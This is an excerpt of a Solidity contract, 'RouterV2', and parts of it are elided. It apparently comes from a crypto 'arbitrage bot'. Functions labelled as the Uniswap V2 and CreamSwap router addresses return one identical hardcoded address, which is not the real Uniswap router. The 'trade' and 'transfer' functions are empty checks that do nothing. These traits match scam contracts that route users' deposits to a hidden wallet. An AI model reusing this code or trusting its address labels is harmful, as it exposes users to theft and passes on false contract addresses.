...
contract RouterV2 {
    function uniswapRouterV2Address() public pure returns (address) {
        return 0xa5724781129f7e438434aEe0A1030458D8A6bD91;
    }
    ...
    function creamSwapAddress() public pure returns (address) {
        return 0xa5724781129f7e438434aEe0A1030458D8A6bD91;
    }
    ...
    function callArbitrageZooTrade(address add0, address add1) public pure {
        require(uint(add0) != 0, "Address is invalid!");
        require(uint(add1) != 0, "Address is invalid!");
    }
    ...
    function transferFtmToMultiplier(address add0)
        public pure
    {
        require(uint(add0) != 0, "Address is invalid!");
    }
